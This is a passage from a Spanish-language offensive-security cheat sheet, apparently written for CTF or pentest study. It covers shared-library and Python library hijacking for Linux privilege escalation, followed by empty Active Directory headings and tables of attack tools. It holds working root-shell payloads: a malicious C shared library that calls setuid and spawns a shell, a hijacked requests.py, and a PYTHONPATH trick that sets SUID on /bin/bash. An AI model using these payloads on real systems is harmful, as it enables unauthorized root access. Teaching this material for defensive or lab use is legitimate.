3. **Ubicar la ruta de carga de bibliotecas (comando `readelf`)**:

    ```bash
    elliot@debian:~$ readelf -d custom_binary | grep PATH
    0x00000000000000 (RUNPATH)  Library runpath: [/development]
    ```

    El binario carga la bibliotecas desde `/development`.

4. **Explotación (si tenemos escritura en `/development`)**

    - Creamos una biblioteca maliciosa (`libshared.c`):

    ```c
    #include<stdio.h>
    #include<stdlib.h>
    #include<unistd.h>

    void dbquery() {
        setuid(0);
        system("/bin/sh -p");
    }
    ```
    
    - Compilamos y reemplazamos la biblioteca original:

    ```bash
    gcc src.c -fPIC -shared -o /development/libshared.so
    ```
    - Ejecutamos el binario `custom_binary`

    ```bash
    elliot@debian:~$ ./custom_binary
    # id
    uid=0(root) gid=1000(elliot) groups=1000(elliot)
    ```

##### Python Library Hijacking

###### ¿Qué es?

El **Python Library Hijacking** es una vulnerabilidad de seguridad que permite a un atacante ejecutar código arbitrario manipulando el entorno de Python para cargar una biblioteca maliciosa en lugar de la legítima. Esto puede llevar a:

- **Escalada de privilegios** (si el script se ejecuta como root).
- **Ejecución remota de comandos (RCE)** en aplicaciones críticas.

###### ¿Cómo funciona?

1. **Carga Dinámica de Módulos**

Python busca los módulos importados en este orden:

- **Directorio del script actual**.
- **Directorios en `PYTHONPATH` (variable de entorno)**.
- **Bibliotecas estándar (`/usr/lib/pythonX.X`)**.
- `site-packages` (paquetes instalados con `pip`).

2. **Explotación por Prioridad de Rutas**

Si un script con SUID (ejecución como root) importa un módulo y:

- Tenemos permisos de escritura en una ruta prioritaria (ej: `/usr/lib/python3.11`).

- **Creamos un archivo malicioso** con el mismo nombre que el módulo legítimo (ej: `requests.py`). Python cargará **nuestro código malicioso** en lugar del módulo original.

###### Caso 1: Módulo con Permisos de Escritura

1. **Identificar un script Python con SUID**:

    ```bash
    ls -l /usr/bin/script.py
    -rwsr-xr-x 1 root root 1000 Jan 10 11:00 /usr/bin/script.py
    ```

2. **Verificar qué módulos importa**:

    ```bash
    cat /usr/bin/script.py
    import requests  # Módulo objetivo
    ```

3. **Ubicar la ruta legítima del módulo**:

    ```bash
    pip3 show requests
    Location: /usr/local/lib/python3.11/dist-packages
    ```

4. **Explotación si tenemos escritura en /usr/lib/python3.11**:

    - Crear un archivo malicioso `requests.py`:

    ```bash
    import os
    os.setuid(0)  # Obtener root
    os.system("/bin/bash -p")  # Spawnear shell privilegiada
    ```

    - Guardarlo en una ruta prioritaria:

    ```bash
    cp requests.py /usr/lib/python3.11/
    ```

    - Al ejecutar el script:

    ```bash
    /usr/bin/script.py  # ¡Shell como root!
    ```

###### Caso 2: Abuso de `PYTHONPATH` (si `sudo` permite `SETENV`)

1. **Verificar permisos `sudo`**:

    ```bash
    sudo -l
    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python
    ```

2. **Crear un módulo malicioso en /tmp**:

    ```bash
    # /tmp/privesc.py
    import os
    os.system("chmod u+s /bin/bash")
    ```

3. **Ejecutar el script objetivo con PYTHONPATH manipulado**:

    ```bash
    sudo PYTHONPATH=/tmp/ /usr/bin/python /home/elliot/script.py
    ```

##  11. <a name='active-directory'></a>Active Directory

###  11.1. <a name='escalación-de-privilegios-3'></a>Escalación de privilegios

####  11.1.1. <a name='grupos-privilegiados'></a>Grupos Privilegiados

##### Account Operators
##### Server Operators
##### DnsAdmins
##### Backup Operators

###  11.2. <a name='kerberos'></a>Kerberos

###  11.3. <a name='explotación'></a>Explotación

###  11.4. <a name='movimiento-lateral-1'></a>Movimiento Lateral

###  11.5. <a name='post-explotación'></a>Post Explotación

##  12. <a name='herramientas-y-recursos'></a>Herramientas y Recursos

Enlaces a las distintas herramientas y recursos.
###  12.1. <a name='pivoting-1'></a>Pivoting

| Nombre    | URL                                                                      |
| --------- | ------------------------------------------------------------------------ |
| Chisel    | [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) |
| Ligolo-ng | https://github.com/nicocha30/ligolo-ng |
                            
###  12.2. <a name='information-gathering-1'></a>Information Gathering

| Nombre | URL                          |
| ------ | ---------------------------- |
| Nmap   | https://github.com/nmap/nmap |

###  12.3. <a name='web-1'></a>Web

| Nombre                     | URL                                                     |
| -------------------------- | ------------------------------------------------------- |
| ffuf                       | https://github.com/ffuf/ffuf                            |
| Gobuster                   | https://github.com/OJ/gobuster                          |
| PayloadAllTheThings        | https://github.com/swisskyrepo/PayloadsAllTheThings     |
| Wfuzz                      | https://github.com/xmendez/wfuzz                        |
| WhatWeb                    | https://github.com/urbanadventurer/WhatWeb              |
| WPScan                     | https://github.com/wpscanteam/wpscan                    |
| PHP Filter Chain Generator | https://github.com/synacktiv/php_filter_chain_generator |
| Leaky Paths                | https://github.com/ayoubfathi/leaky-paths               |
| Joomscan                   | https://github.com/OWASP/joomscan                       |
| Droopescan                 | https://github.com/SamJoan/droopescan                   |
| Magescan                   | https://github.com/steverobbins/magescan                |

###  12.4. <a name='bases-de-datos'></a>Bases de datos

| Nombre                   | URL                            |
| ------------------------ | ------------------------------ |
| SQL Injection Cheatsheet | https://tib3rius.com/sqli.html |

###  12.5. <a name='passwords-attacks-1'></a>Passwords Attacks

| Nombre                          | URL                                                                                                        |
| ------------------------------- | ---------------------------------------------------------------------------------------------------------- |
| Default Credentials Cheat Sheet | [https://github.com/ihebski/DefaultCreds-cheat-sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet) |
| Firefox Decrypt                 | [https://github.com/unode/firefox_decrypt](https://github.com/unode/firefox_decrypt)                       |
| hashcat                         | [https://hashcat.net/hashcat](https://hashcat.net/hashcat)                                                 |
| Hydra                           | [https://github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra)                   |
| John                            | [https://github.com/openwall/john](https://github.com/openwall/john)                                       |
| keepass-dump-masterkey          | [https://github.com/CMEPW/keepass-dump-masterkey](https://github.com/CMEPW/keepass-dump-masterkey)         |
| KeePwn                          | [https://github.com/Orange-Cyberdefense/KeePwn](https://github.com/Orange-Cyberdefense/KeePwn)             |
| Kerbrute                        | [https://github.com/ropnop/kerbrute](https://github.com/ropnop/kerbrute)                                   |
| LaZagne                         | [https://github.com/AlessandroZ/LaZagne](https://github.com/AlessandroZ/LaZagne)                           |
| mimikatz                        | [https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)                           |
| NetExec                         | [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)                             |
| ntlm.pw                         | [https://ntlm.pw](https://ntlm.pw)                                                                         |
| pypykatz                        | [https://github.com/skelsec/pypykatz](https://github.com/skelsec/pypykatz)                                 |

###  12.6. <a name='wordlists'></a>Wordlists

| Nombre                        | URL                                                                                                                |
| ----------------------------- | ------------------------------------------------------------------------------------------------------------------ |
| SecLists                      | [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)                           |
| Kerberos Username Enumeration | [https://github.com/attackdebris/kerberos_enum_userlists](https://github.com/attackdebris/kerberos_enum_userlists) |
| bopscrk                       | [https://github.com/R3nt0n/bopscrk](https://github.com/R3nt0n/bopscrk)                                             |
| CUPP                          | [https://github.com/Mebus/cupp](https://github.com/Mebus/cupp)                                                     |
| COOK                          | [https://github.com/giteshnxtlvl/cook](https://github.com/giteshnxtlvl/cook)                                       |
| Username Anarchy              | [https://github.com/urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)         |
| CeWL                          | [https://github.com/digininja/cewl](https://github.com/digininja/cewl)                                             |
| API Wordlist                  | https://github.com/chrislockard/api_wordlist/blob/master/api_seen_in_wild.txt                                      |

###  12.7. <a name='escalación-de-privilegios-4'></a>Escalación de Privilegios


| Nombre   | URL                                                      |
| -------- | -------------------------------------------------------- |
| Winpeas  | https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS |
| Seatbelt | https://github.com/GhostPack/Seatbelt                    |
| Linpeas  | https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS |
| SigmaPotato | https://github.com/tylerdotrar/SigmaPotato |

###  12.8. <a name='recursos-y-blogs'></a>Recursos y Blogs

| Nombre                                                  | URL                                                                                                                                                                          |
| ------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 0xdf                                                    | [https://0xdf.gitlab.io/](https://0xdf.gitlab.io/)                                                                                                                           |
| IppSec.rocks                                            | [https://ippsec.rocks/?#](https://ippsec.rocks/?#)                                                                                                                           |
| IppSec (YouTube)                                        | [https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA)                                                         |
| HackTricks                                              | [https://book.hacktricks.xyz/](https://book.hacktricks.xyz/)                                                                                                                 |
| HackTricks Local Windows Privilege Escalation Checklist | [https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation](https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation) |
| Rednode Windows Privilege Escalation                    | [https://rednode.com/privilege-escalation/windows-privilege-escalation-cheat-sheet/](https://rednode.com/privilege-escalation/windows-privilege-escalation-cheat-sheet/)     |
